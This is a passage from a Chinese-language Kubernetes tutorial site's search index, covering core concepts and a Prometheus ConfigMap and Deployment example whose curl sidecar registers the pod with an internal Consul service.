Deployment\u53ef\u4ee5\u90e8\u7f72\u591a\u4e2a\u526f\u672c\uff0c\u6bcf\u4e2aPod\u90fd\u6709\u81ea\u5df1\u7684IP\uff0c\u5916\u754c\u5982\u4f55\u8bbf\u95ee\u8fd9\u4e9b\u526f\u672c\u5462\uff1f \u901a\u8fc7Pod\u7684IP\u5417\uff1f \u8981\u77e5\u9053Pod\u5f88\u53ef\u80fd\u4f1a\u88ab\u9891\u7e41\u5730\u9500\u6bc1\u548c\u91cd\u542f\uff0c\u5b83\u4eec\u7684IP\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u7528IP\u6765\u8bbf\u95ee\u4e0d\u592a\u73b0\u5b9e\u3002 \u7b54\u6848\u662fService\u3002 Kubernetes Service\u5b9a\u4e49\u4e86\u5916\u754c\u8bbf\u95ee\u4e00\u7ec4\u7279\u5b9aPod\u7684\u65b9\u5f0f\u3002Service\u6709\u81ea\u5df1\u7684IP\u548c\u7aef\u53e3\uff0cService\u4e3aPod\u63d0\u4f9b\u4e86\u8d1f\u8f7d\u5747\u8861\u3002 Kubernetes\u8fd0\u884c\u5bb9\u5668\uff08Pod\uff09\u4e0e\u8bbf\u95ee\u5bb9\u5668\uff08Pod\uff09\u8fd9\u4e24\u9879\u4efb\u52a1\u5206\u522b\u7531Controller\u548cService\u6267\u884c\u3002 Namespace \u5982\u679c\u6709\u591a\u4e2a\u7528\u6237\u6216\u9879\u76ee\u7ec4\u4f7f\u7528\u540c\u4e00\u4e2aKubernetes Cluster\uff0c\u5982\u4f55\u5c06\u4ed6\u4eec\u521b\u5efa\u7684Controller\u3001Pod\u7b49\u8d44\u6e90\u5206\u5f00\u5462\uff1f \u7b54\u6848\u5c31\u662fNamespace\u3002 Namespace\u53ef\u4ee5\u5c06\u4e00\u4e2a\u7269\u7406\u7684Cluster\u903b\u8f91\u4e0a\u5212\u5206\u6210\u591a\u4e2a\u865a\u62dfCluster\uff0c\u6bcf\u4e2aCluster\u5c31\u662f\u4e00\u4e2aNamespace\u3002\u4e0d\u540cNamespace\u91cc\u7684\u8d44\u6e90\u662f\u5b8c\u5168\u9694\u79bb\u7684\u3002 Kubernetes\u9ed8\u8ba4\u521b\u5efa\u4e86\u4e24\u4e2aNamespace\uff0c\u5982\u56fe2-3\u6240\u793a\u3002 \u56fe2-3 default\uff1a\u521b\u5efa\u8d44\u6e90\u65f6\u5982\u679c\u4e0d\u6307\u5b9a\uff0c\u5c06\u88ab\u653e\u5230\u8fd9\u4e2aNamespace\u4e2d\u3002 kube-system\uff1aKubernetes\u81ea\u5df1\u521b\u5efa\u7684\u7cfb\u7edf\u8d44\u6e90\u5c06\u653e\u5230\u8fd9\u4e2aNamespace\u4e2d\u3002 Label Label \u662f\u8bc6\u522b Kubernetes \u5bf9\u8c61\u7684\u6807\u7b7e\uff0c\u4ee5 key/value \u7684\u65b9\u5f0f\u9644\u52a0\u5230\u5bf9\u8c61\u4e0a\uff08key \u6700\u957f\u4e0d\u80fd\u8d85\u8fc7 63 \u5b57\u8282\uff0cvalue \u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e0d\u8d85\u8fc7 253 \u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff09\u3002 Label \u4e0d\u63d0\u4f9b\u552f\u4e00\u6027\uff0c\u5e76\u4e14\u5b9e\u9645\u4e0a\u7ecf\u5e38\u662f\u5f88\u591a\u5bf9\u8c61\uff08\u5982 Pods\uff09\u90fd\u4f7f\u7528\u76f8\u540c\u7684 label \u6765\u6807\u5fd7\u5177\u4f53\u7684\u5e94\u7528\u3002 Label \u5b9a\u4e49\u597d\u540e\u5176\u4ed6\u5bf9\u8c61\u53ef\u4ee5\u4f7f\u7528 Label Selector \u6765\u9009\u62e9\u4e00\u7ec4\u76f8\u540c label \u7684\u5bf9\u8c61\uff08\u6bd4\u5982 ReplicaSet \u548c Service \u7528 label \u6765\u9009\u62e9\u4e00\u7ec4 Pod\uff09\u3002Label Selector \u652f\u6301\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\uff1a \u7b49\u5f0f\uff0c\u5982 app=nginx \u548c env!=production \u96c6\u5408\uff0c\u5982 env in (production, qa) \u591a\u4e2a label\uff08\u5b83\u4eec\u4e4b\u95f4\u662f AND \u5173\u7cfb\uff09\uff0c\u5982 app=nginx,env=test Annotations Annotations \u662f key/value \u5f62\u5f0f\u9644\u52a0\u4e8e\u5bf9\u8c61\u7684\u6ce8\u89e3\u3002\u4e0d\u540c\u4e8e Labels \u7528\u4e8e\u6807\u5fd7\u548c\u9009\u62e9\u5bf9\u8c61\uff0cAnnotations \u5219\u662f\u7528\u6765\u8bb0\u5f55\u4e00\u4e9b\u9644\u52a0\u4fe1\u606f\uff0c\u7528\u6765\u8f85\u52a9\u5e94\u7528\u90e8\u7f72\u3001\u5b89\u5168\u7b56\u7565\u4ee5\u53ca\u8c03\u5ea6\u7b56\u7565\u7b49\u3002\u6bd4\u5982 deployment \u4f7f\u7528 annotations \u6765\u8bb0\u5f55 rolling update \u7684\u72b6\u6001\u3002","title":"\u57fa\u7840\u6982\u5ff5"},{"location":"lxc/kubernetes/basic/#_1","text":"","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"lxc/kubernetes/basic/#cluster","text":"Cluster\u662f\u8ba1\u7b97\u3001\u5b58\u50a8\u548c\u7f51\u7edc\u8d44\u6e90\u7684\u96c6\u5408\uff0cKubernetes\u5229\u7528\u8fd9\u4e9b\u8d44\u6e90\u8fd0\u884c\u5404\u79cd\u57fa\u4e8e\u5bb9\u5668\u7684\u5e94\u7528\u3002","title":"Cluster"},{"location":"lxc/kubernetes/basic/#master","text":"Master\u662fCluster\u7684\u5927\u8111\uff0c\u5b83\u7684\u4e3b\u8981\u804c\u8d23\u662f\u8c03\u5ea6\uff0c\u5373\u51b3\u5b9a\u5c06\u5e94\u7528\u653e\u5728\u54ea\u91cc\u8fd0\u884c\u3002Master\u8fd0\u884cLinux\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u4ee5\u662f\u7269\u7406\u673a\u6216\u8005\u865a\u62df\u673a\u3002\u4e3a\u4e86\u5b9e\u73b0\u9ad8\u53ef\u7528\uff0c\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2aMaster\u3002","title":"Master"},{"location":"lxc/kubernetes/basic/#1api-server","text":"\u8d44\u6e90\u64cd\u4f5c\u7684\u552f\u4e00\u5165\u53e3\uff0c\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u63d0\u4f9b\u8ba4\u8bc1\uff0c\u6388\u6743\u3001API\u6ce8\u518c\u548c\u53d1\u73b0\u7b49\u673a\u5236","title":"1.API server"},{"location":"lxc/kubernetes/basic/#2scheduler","text":"\u8d1f\u8d23\u96c6\u7fa4\u8d44\u6e90\u7684\u8c03\u5ea6\uff0c\u6309\u7167\u9884\u5b9a\u7684\u8c03\u5ea6\u7b56\u7565\u5c06pod\u8c03\u5ea6\u5230\u76f8\u5e94\u7684node\u8282\u70b9\u4e0a","title":"2.Scheduler"},{"location":"lxc/kubernetes/basic/#3controller-manager","text":"\u8d1f\u8d23\u7ef4\u62a4\u96c6\u7fa4\u7684\u72b6\u6001\uff0c\u6bd4\u7a0b\u5e8f\u90e8\u7f72\u5b89\u6392\uff0c\u6545\u969c\u68c0\u6d4b\uff0c\u81ea\u52a8\u6269\u5c55\uff0c\u6eda\u52a8\u66f4\u65b0\u7b49","title":"3.Controller-manager"},{"location":"lxc/kubernetes/basic/#4etcd","text":"\u8d1f\u8d23\u5b58\u50a8\u96c6\u7fa4\u4e2d\u5404\u79cd\u8d44\u6e90\u5bf9\u8c61\u7684\u4fe1\u606f","title":"4.Etcd"},{"location":"lxc/kubernetes/basic/#node","text":"Node\u7684\u804c\u8d23\u662f\u8fd0\u884c\u5bb9\u5668\u5e94\u7528\u3002Node\u7531Master\u7ba1\u7406\uff0cNode\u8d1f\u8d23\u76d1\u63a7\u5e76\u6c47\u62a5\u5bb9\u5668\u7684\u72b6\u6001\uff0c\u540c\u65f6\u6839\u636eMaster\u7684\u8981\u6c42\u7ba1\u7406\u5bb9\u5668\u7684\u751f\u547d\u5468\u671f\u3002Node\u8fd0\u884c\u5728Linux\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u53ef\u4ee5\u662f\u7269\u7406\u673a\u6216\u8005\u662f\u865a\u62df\u673a\u3002","title":"Node"},{"location":"lxc/kubernetes/basic/#1kubelet","text":"\u4f5c\u7528\uff1a\u7ba1\u7406\u672c\u673a\u7684\u5bb9\u5668","title":"1.kubelet"},{"location":"lxc/kubernetes/basic/#2kube-proxy","text":"\u4f5c\u7528\uff1a\u8d1f\u8d23\u63d0\u4f9b\u96c6\u7fa4\u5185\u90e8\u7684\u670d\u52a1\u53d1\u73b0\u548c\u8d1f\u8f7d\u5747\u8861","title":"2.kube-proxy"},{"location":"lxc/kubernetes/basic/#3docker","text":"\u4f5c\u7528\uff1a\u8d1f\u8d23\u8282\u70b9\u4e0a\u5bb9\u5668\u7684\u5404\u79cd\u64cd\u4f5c","title":"3.docker"},{"location":"lxc/kubernetes/basic/#pod","text":"Pod\u662fKubernetes\u7684\u6700\u5c0f\u5de5\u4f5c\u5355\u5143\u3002\u6bcf\u4e2aPod\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u3002Pod\u4e2d\u7684\u5bb9\u5668\u4f1a\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u88abMaster\u8c03\u5ea6\u5230\u4e00\u4e2aNode\u4e0a\u8fd0\u884c\u3002 Kubernetes\u5f15\u5165Pod\u4e3b\u8981\u57fa\u4e8e\u4e0b\u9762\u4e24\u4e2a\u76ee\u7684\uff1a 1\uff09\u53ef\u7ba1\u7406\u6027\u3002 \u6709\u4e9b\u5bb9\u5668\u5929\u751f\u5c31\u662f\u9700\u8981\u7d27\u5bc6\u8054\u7cfb\uff0c\u4e00\u8d77\u5de5\u4f5c\u3002Pod\u63d0\u4f9b\u4e86\u6bd4\u5bb9\u5668\u66f4\u9ad8\u5c42\u6b21\u7684\u62bd\u8c61\uff0c\u5c06\u5b83\u4eec\u5c01\u88c5\u5230\u4e00\u4e2a\u90e8\u7f72\u5355\u5143\u4e2d\u3002Kubernetes\u4ee5Pod\u4e3a\u6700\u5c0f\u5355\u4f4d\u8fdb\u884c\u8c03\u5ea6\u3001\u6269\u5c55\u3001\u5171\u4eab\u8d44\u6e90\u3001\u7ba1\u7406\u751f\u547d\u5468\u671f\u3002 2\uff09\u901a\u4fe1\u548c\u8d44\u6e90\u5171\u4eab\u3002 Pod\u4e2d\u7684\u6240\u6709\u5bb9\u5668\u4f7f\u7528\u540c\u4e00\u4e2a\u7f51\u7edcnamespace\uff0c\u5373\u76f8\u540c\u7684IP\u5730\u5740\u548cPort\u7a7a\u95f4\u3002\u5b83\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528localhost\u901a\u4fe1\u3002\u540c\u6837\u7684\uff0c\u8fd9\u4e9b\u5bb9\u5668\u53ef\u4ee5\u5171\u4eab\u5b58\u50a8\uff0c\u5f53Kubernetes\u6302\u8f7dvolume\u5230Pod\uff0c\u672c\u8d28\u4e0a\u662f\u5c06volume\u6302\u8f7d\u5230Pod\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5bb9\u5668\u3002 Pods\u6709\u4e24\u79cd\u4f7f\u7528\u65b9\u5f0f\uff1a 1\uff09\u8fd0\u884c\u5355\u4e00\u5bb9\u5668\u3002 one-container-per-Pod\u662fKubernetes\u6700\u5e38\u89c1\u7684\u6a21\u578b\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ea\u662f\u5c06\u5355\u4e2a\u5bb9\u5668\u7b80\u5355\u5c01\u88c5\u6210Pod\u3002\u5373\u4fbf\u662f\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668\uff0cKubernetes\u7ba1\u7406\u7684\u4e5f\u662fPod\u800c\u4e0d\u662f\u76f4\u63a5\u7ba1\u7406\u5bb9\u5668\u3002 2\uff09\u8fd0\u884c\u591a\u4e2a\u5bb9\u5668\u3002 \u95ee\u9898\u5728\u4e8e\uff1a\u54ea\u4e9b\u5bb9\u5668\u5e94\u8be5\u653e\u5230\u4e00\u4e2aPod\u4e2d\uff1f \u7b54\u6848\u662f\uff1a\u8fd9\u4e9b\u5bb9\u5668\u8054\u7cfb\u5fc5\u987b\u975e\u5e38\u7d27\u5bc6\uff0c\u800c\u4e14\u9700\u8981\u76f4\u63a5\u5171\u4eab\u8d44\u6e90\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cPod\u5305\u542b\u4e24\u4e2a\u5bb9\u5668\uff1a\u4e00\u4e2a\u662fFile Puller\uff0c\u4e00\u4e2a\u662fWeb Server\u3002File Puller\u4f1a\u5b9a\u671f\u4ece\u5916\u90e8\u7684Content Manager\u4e2d\u62c9\u53d6\u6700\u65b0\u7684\u6587\u4ef6\uff0c\u5c06\u5176\u5b58\u653e\u5728\u5171\u4eab\u7684volume\u4e2d\u3002Web Server\u4ecevolume\u8bfb\u53d6\u6587\u4ef6\uff0c\u54cd\u5e94Consumer\u7684\u8bf7\u6c42\u3002 \u8fd9\u4e24\u4e2a\u5bb9\u5668\u662f\u7d27\u5bc6\u534f\u4f5c\u7684\uff0c\u5b83\u4eec\u4e00\u8d77\u4e3aConsumer\u63d0\u4f9b\u6700\u65b0\u7684\u6570\u636e\uff1b\u540c\u65f6\u5b83\u4eec\u4e5f\u901a\u8fc7volume\u5171\u4eab\u6570\u636e\uff0c\u6240\u4ee5\u653e\u5230\u4e00\u4e2aPod\u662f\u5408\u9002\u7684\u3002 \u518d\u6765\u770b\u4e00\u4e2a\u53cd\u4f8b\uff1a\u662f\u5426\u9700\u8981\u5c06Tomcat\u548cMySQL\u653e\u5230\u4e00\u4e2aPod\u4e2d\uff1f Tomcat\u4eceMySQL\u8bfb\u53d6\u6570\u636e\uff0c\u5b83\u4eec\u4e4b\u95f4\u9700\u8981\u534f\u4f5c\uff0c\u4f46\u8fd8\u4e0d\u81f3\u4e8e\u9700\u8981\u653e\u5230\u4e00\u4e2aPod\u4e2d\u4e00\u8d77\u90e8\u7f72\u3001\u4e00\u8d77\u542f\u52a8\u3001\u4e00\u8d77\u505c\u6b62\u3002\u540c\u65f6\u5b83\u4eec\u4e4b\u95f4\u662f\u901a\u8fc7JDBC\u4ea4\u6362\u6570\u636e\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u5171\u4eab\u5b58\u50a8\uff0c\u6240\u4ee5\u653e\u5230\u5404\u81ea\u7684Pod\u4e2d\u66f4\u5408\u9002\u3002","title":"Pod"},{"location":"lxc/kubernetes/basic/#controller","text":"Kubernetes\u901a\u5e38\u4e0d\u4f1a\u76f4\u63a5\u521b\u5efaPod\uff0c\u800c\u662f\u901a\u8fc7Controller\u6765\u7ba1\u7406Pod\u7684\u3002Controller\u4e2d\u5b9a\u4e49\u4e86Pod\u7684\u90e8\u7f72\u7279\u6027\uff0c\u6bd4\u5982\u6709\u51e0\u4e2a\u526f\u672c\u3001\u5728\u4ec0\u4e48\u6837\u7684Node\u4e0a\u8fd0\u884c\u7b49\u3002\u4e3a\u4e86\u6ee1\u8db3\u4e0d\u540c\u7684\u4e1a\u52a1\u573a\u666f\uff0cKubernetes\u63d0\u4f9b\u4e86\u591a\u79cdController\uff0c\u5305\u62ecDeployment\u3001ReplicaSet\u3001DaemonSet\u3001StatefuleSet\u3001Job\u7b49\uff0c\u9010\u4e00\u8ba8\u8bba\u3002","title":"Controller"},{"location":"lxc/kubernetes/basic/#1deployment","text":"Deployment\u662f\u6700\u5e38\u7528\u7684Controller\uff0c\u6bd4\u5982\u5728\u7ebf\u6559\u7a0b\u4e2d\u5c31\u662f\u901a\u8fc7\u521b\u5efaDeployment\u6765\u90e8\u7f72\u5e94\u7528\u7684\u3002Deployment\u53ef\u4ee5\u7ba1\u7406Pod\u7684\u591a\u4e2a\u526f\u672c\uff0c\u5e76\u786e\u4fddPod\u6309\u7167\u671f\u671b\u7684\u72b6\u6001\u8fd0\u884c\u3002","title":"1.Deployment"},{"location":"lxc/kubernetes/basic/#2replicaset","text":"\uff082\uff09ReplicaSet\u5b9e\u73b0\u4e86Pod\u7684\u591a\u526f\u672c\u7ba1\u7406\u3002\u4f7f\u7528Deployment\u65f6\u4f1a\u81ea\u52a8\u521b\u5efaReplicaSet\uff0c\u4e5f\u5c31\u662f\u8bf4Deployment\u662f\u901a\u8fc7ReplicaSet\u6765\u7ba1\u7406Pod\u7684\u591a\u4e2a\u526f\u672c\u7684\uff0c\u6211\u4eec\u901a\u5e38\u4e0d\u9700\u8981\u76f4\u63a5\u4f7f\u7528ReplicaSet\u3002","title":"2.ReplicaSet"},{"location":"lxc/kubernetes/basic/#3daemonset","text":"\uff083\uff09DaemonSet\u7528\u4e8e\u6bcf\u4e2aNode\u6700\u591a\u53ea\u8fd0\u884c\u4e00\u4e2aPod\u526f\u672c\u7684\u573a\u666f\u3002\u6b63\u5982\u5176\u540d\u79f0\u6240\u63ed\u793a\u7684\uff0cDaemonSet\u901a\u5e38\u7528\u4e8e\u8fd0\u884cdaemon\u3002","title":"3.DaemonSet"},{"location":"lxc/kubernetes/basic/#4statefuleset","text":"\uff084\uff09StatefuleSet\u80fd\u591f\u4fdd\u8bc1Pod\u7684\u6bcf\u4e2a\u526f\u672c\u5728\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u540d\u79f0\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u5176\u4ed6Controller\u4e0d\u63d0\u4f9b\u8fd9\u4e2a\u529f\u80fd\u3002\u5f53\u67d0\u4e2aPod\u53d1\u751f\u6545\u969c\u9700\u8981\u5220\u9664\u5e76\u91cd\u65b0\u542f\u52a8\u65f6\uff0cPod\u7684\u540d\u79f0\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u540c\u65f6StatefuleSet\u4f1a\u4fdd\u8bc1\u526f\u672c\u6309\u7167\u56fa\u5b9a\u7684\u987a\u5e8f\u542f\u52a8\u3001\u66f4\u65b0\u6216\u8005\u5220\u9664\u3002","title":"4.StatefuleSet"},{"location":"lxc/kubernetes/basic/#4job","text":"\uff085\uff09Job\u7528\u4e8e\u8fd0\u884c\u7ed3\u675f\u5c31\u5220\u9664\u7684\u5e94\u7528\uff0c\u800c\u5176\u4ed6Controller\u4e2d\u7684Pod\u901a\u5e38\u662f\u957f\u671f\u6301\u7eed\u8fd0\u884c\u3002","title":"4.Job"},{"location":"lxc/kubernetes/basic/#service","text":"Deployment\u53ef\u4ee5\u90e8\u7f72\u591a\u4e2a\u526f\u672c\uff0c\u6bcf\u4e2aPod\u90fd\u6709\u81ea\u5df1\u7684IP\uff0c\u5916\u754c\u5982\u4f55\u8bbf\u95ee\u8fd9\u4e9b\u526f\u672c\u5462\uff1f \u901a\u8fc7Pod\u7684IP\u5417\uff1f \u8981\u77e5\u9053Pod\u5f88\u53ef\u80fd\u4f1a\u88ab\u9891\u7e41\u5730\u9500\u6bc1\u548c\u91cd\u542f\uff0c\u5b83\u4eec\u7684IP\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u7528IP\u6765\u8bbf\u95ee\u4e0d\u592a\u73b0\u5b9e\u3002 \u7b54\u6848\u662fService\u3002 Kubernetes Service\u5b9a\u4e49\u4e86\u5916\u754c\u8bbf\u95ee\u4e00\u7ec4\u7279\u5b9aPod\u7684\u65b9\u5f0f\u3002Service\u6709\u81ea\u5df1\u7684IP\u548c\u7aef\u53e3\uff0cService\u4e3aPod\u63d0\u4f9b\u4e86\u8d1f\u8f7d\u5747\u8861\u3002 Kubernetes\u8fd0\u884c\u5bb9\u5668\uff08Pod\uff09\u4e0e\u8bbf\u95ee\u5bb9\u5668\uff08Pod\uff09\u8fd9\u4e24\u9879\u4efb\u52a1\u5206\u522b\u7531Controller\u548cService\u6267\u884c\u3002","title":"Service"},{"location":"lxc/kubernetes/basic/#namespace","text":"\u5982\u679c\u6709\u591a\u4e2a\u7528\u6237\u6216\u9879\u76ee\u7ec4\u4f7f\u7528\u540c\u4e00\u4e2aKubernetes Cluster\uff0c\u5982\u4f55\u5c06\u4ed6\u4eec\u521b\u5efa\u7684Controller\u3001Pod\u7b49\u8d44\u6e90\u5206\u5f00\u5462\uff1f \u7b54\u6848\u5c31\u662fNamespace\u3002 Namespace\u53ef\u4ee5\u5c06\u4e00\u4e2a\u7269\u7406\u7684Cluster\u903b\u8f91\u4e0a\u5212\u5206\u6210\u591a\u4e2a\u865a\u62dfCluster\uff0c\u6bcf\u4e2aCluster\u5c31\u662f\u4e00\u4e2aNamespace\u3002\u4e0d\u540cNamespace\u91cc\u7684\u8d44\u6e90\u662f\u5b8c\u5168\u9694\u79bb\u7684\u3002 Kubernetes\u9ed8\u8ba4\u521b\u5efa\u4e86\u4e24\u4e2aNamespace\uff0c\u5982\u56fe2-3\u6240\u793a\u3002 \u56fe2-3 default\uff1a\u521b\u5efa\u8d44\u6e90\u65f6\u5982\u679c\u4e0d\u6307\u5b9a\uff0c\u5c06\u88ab\u653e\u5230\u8fd9\u4e2aNamespace\u4e2d\u3002 kube-system\uff1aKubernetes\u81ea\u5df1\u521b\u5efa\u7684\u7cfb\u7edf\u8d44\u6e90\u5c06\u653e\u5230\u8fd9\u4e2aNamespace\u4e2d\u3002","title":"Namespace"},{"location":"lxc/kubernetes/basic/#label","text":"Label \u662f\u8bc6\u522b Kubernetes \u5bf9\u8c61\u7684\u6807\u7b7e\uff0c\u4ee5 key/value \u7684\u65b9\u5f0f\u9644\u52a0\u5230\u5bf9\u8c61\u4e0a\uff08key \u6700\u957f\u4e0d\u80fd\u8d85\u8fc7 63 \u5b57\u8282\uff0cvalue \u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e0d\u8d85\u8fc7 253 \u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff09\u3002 Label \u4e0d\u63d0\u4f9b\u552f\u4e00\u6027\uff0c\u5e76\u4e14\u5b9e\u9645\u4e0a\u7ecf\u5e38\u662f\u5f88\u591a\u5bf9\u8c61\uff08\u5982 Pods\uff09\u90fd\u4f7f\u7528\u76f8\u540c\u7684 label \u6765\u6807\u5fd7\u5177\u4f53\u7684\u5e94\u7528\u3002 Label \u5b9a\u4e49\u597d\u540e\u5176\u4ed6\u5bf9\u8c61\u53ef\u4ee5\u4f7f\u7528 Label Selector \u6765\u9009\u62e9\u4e00\u7ec4\u76f8\u540c label \u7684\u5bf9\u8c61\uff08\u6bd4\u5982 ReplicaSet \u548c Service \u7528 label \u6765\u9009\u62e9\u4e00\u7ec4 Pod\uff09\u3002Label Selector \u652f\u6301\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\uff1a \u7b49\u5f0f\uff0c\u5982 app=nginx \u548c env!=production \u96c6\u5408\uff0c\u5982 env in (production, qa) \u591a\u4e2a label\uff08\u5b83\u4eec\u4e4b\u95f4\u662f AND \u5173\u7cfb\uff09\uff0c\u5982 app=nginx,env=test","title":"Label"},{"location":"lxc/kubernetes/basic/#annotations","text":"Annotations \u662f key/value \u5f62\u5f0f\u9644\u52a0\u4e8e\u5bf9\u8c61\u7684\u6ce8\u89e3\u3002\u4e0d\u540c\u4e8e Labels \u7528\u4e8e\u6807\u5fd7\u548c\u9009\u62e9\u5bf9\u8c61\uff0cAnnotations \u5219\u662f\u7528\u6765\u8bb0\u5f55\u4e00\u4e9b\u9644\u52a0\u4fe1\u606f\uff0c\u7528\u6765\u8f85\u52a9\u5e94\u7528\u90e8\u7f72\u3001\u5b89\u5168\u7b56\u7565\u4ee5\u53ca\u8c03\u5ea6\u7b56\u7565\u7b49\u3002\u6bd4\u5982 deployment \u4f7f\u7528 annotations \u6765\u8bb0\u5f55 rolling update \u7684\u72b6\u6001\u3002","title":"Annotations"},{"location":"lxc/kubernetes/configmap-one/","text":"Depleyment\u6302\u8f7d\u914d\u7f6e\u6587\u4ef6 \u4f8b\u5982prometheus\u6302\u8f7d\u914d\u7f6e\u6587\u4ef6 \u914d\u7f6e\u6587\u4ef6\uff1aprometheus.yml \u4ee5ConfigMap\u5f62\u5f0f\u5b58\u50a8\uff0c\u5982\u4e0b\uff0c\u5728K8S\u4e2d\u7528 kubectl apply -f prometheus-yml.yaml \u547d\u4ee4 \u53d1\u5e03 \u4e0b\u9762\u5185\u5bb9\u6587\u4ef6\u540d\u4e3a\uff1a prometheus-yml.yaml apiVersion: v1 kind: ConfigMap metadata: name: infra-prometheus-yml namespace: default data: prometheus.yml: >- global: scrape_interval: 15s evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: rule_files: scrape_configs: - job_name: 'prometheus' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [__meta_consul_service] regex: .*prometheus.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - job_name: 'node-exporter' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [__meta_consul_service] regex: .*node-exporter.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap - job_name: 'kube-state-metrics' consul_sd_configs: - server: 'infra-consul-net:8500' services: [] relabel_configs: - source_labels: [ __meta_consul_service ] regex: .*kube-state-metrics.* action: keep - regex: __meta_consul_service_metadata_(.+) action: labelmap \u5e94\u7528\u90e8\u7f72\u6587\u4ef6\uff1aprometheus-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: infra-prometheus namespace: default labels: app: infra-prometheus version: infra-prometheus-uat-podname spec: replicas: 1 progressDeadlineSeconds: 600 selector: matchLabels: app: infra-prometheus template: metadata: labels: app: infra-prometheus version: infra-prometheus-uat-podname spec: containers: - name: infra-prometheus-uat-podname image: prom/prometheus:latest #\u6302\u8f7d\u4e0b\u9762\u7684configmap volumeMounts: - mountPath: /etc/prometheus/prometheus.yml subPath: prometheus.yml name: appconfs #\u8bbe\u7f6eIP\uff0cPOD_Name\u53d8\u91cf env: - name: MY_POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: MY_POD_IP valueFrom: fieldRef: fieldPath: status.podIP - name: ENV value: UAT ports: - name: requestshttp containerPort: 9090 protocol: TCP - name: curl image: curlimages/curl:latest env: - name: MY_POD_NAME valueFrom: fieldRef: fieldPath: metadata.name - name: MY_POD_IP valueFrom: fieldRef: fieldPath: status.podIP - name: ENV value: UAT #\u8be5\u547d\u4ee4\u8ba9\u5bb9\u5668\u6c38\u4e45\u8fd0\u884c command: [ '/bin/sh','-c' ] args: ['while true;do sleep 1s;done'] lifecycle: postStart: exec: command: [ '/bin/sh','-c','curl -X PUT -d \"{\\\"id\\\": \\\"prometheus-$MY_POD_IP\\\",\\\"name\\\": \\\"prometheus\\\",\\\"address\\\":\\\"$MY_POD_IP\\\",\\\"port\\\": 9090,\\\"tags\\\": [\\\"prometheus\\\"],\\\"checks\\\": [{\\\"http\\\": \\\"http://$MY_POD_IP:9090/metrics\\\", \\\"interval\\\": \\\"15s\\\"}]}\" http://infra-consul-net:8500/v1/agent/service/register && echo \"{\\\"id\\\": \\\"prometheus-$MY_POD_IP\\\",\\\"name\\\": \\\"prometheus\\\",\\\"address\\\":\\\"$MY_POD_IP\\\",\\\"port\\\": 9090,\\\"tags\\\": [\\\"prometheus\\\"],\\\"checks\\\": [{\\\"http\\\": \\\"http://$MY_POD_IP:9090/metrics\\\", \\\"interval\\\": \\\"15s\\\"}]}\" > /tmp/curl.txt' ] preStop: exec: command: [ '/bin/sh','-c','curl -X PUT http://infra-consul-net:8500/v1/agent/service/deregister/prometheus-$MY_POD_IP' ] #\u58f0\u660econfigmap\u7684\u90e8\u5206\u952e\u503c volumes: - name: appconfs configMap: name: infra-prometheus-yml items: - key: prometheus.yml path: prometheus.yml configMap\u5377\u63d2\u4ef6\u4e2d\u7684items\u5b57\u6bb5\u7684\u503c\u662f\u4e00\u4e2a\u5bf9\u8c61\u5217\u8868\uff0c\u53ef\u5d4c\u5957\u4f7f\u75283\u4e2a\u5b57\u6bb5\u6765\u7ec4\u5408\u6307\u5b9a\u8981\u5f15\u7528\u7684\u7279\u5b9a\u952e\u3002 \u25aakey \uff1a\u8981\u5f15\u7528\u7684\u952e\u540d\u79f0\uff0c\u5fc5\u9009\u5b57\u6bb5\u3002 \u25aapath \uff1a\u5bf9\u5e94\u7684\u952e\u5728\u6302\u8f7d\u70b9\u76ee\u5f55\u4e2d\u6620\u5c04\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5b83\u53ef\u4e0d\u540c\u4e8e\u952e\u540d\u79f0\uff0c\u5fc5\u9009\u5b57\u6bb5\u3002 \u25aamode \uff1a\u6587\u4ef6\u7684\u6743\u9650\u6a21\u578b\uff0c\u53ef\u7528\u8303\u56f4\u4e3a0\uff5e0777\u3002 https://www.jianshu.com/p/762c8ccdb092","title":"deployment\u6dfb\u52a0\u914d\u7f6e\u6587\u4ef6"},{"location":"lxc/kubernetes/configmap-one/#depleyment","text":"\u4f8b\u5982prometheus\u6302\u8f7d\u914d\u7f6e\u6587\u4ef6 \u914d\u7f6e\u6587\u4ef6\uff1aprometheus.yml \u4ee5ConfigMap\u5f62\u5f0f\u5b58\u50a8\uff0c\u5982\u4e0b\uff0c\u5728K8S\u4e2d\u7528 kubectl apply -f prometheus-yml.yaml \u547d\u4ee4 \u53d1\u5e03 \u4e0b\u9762\u5185\u5bb9\u6587\u4ef6\u540d\u4e3a\uff1a prometheus-yml.yaml apiVersion: v1 kind: ConfigMap metadata: name: infra-prometheus-yml namespace: default data: prometheus.yml: >- global: scrape_interval: 15s 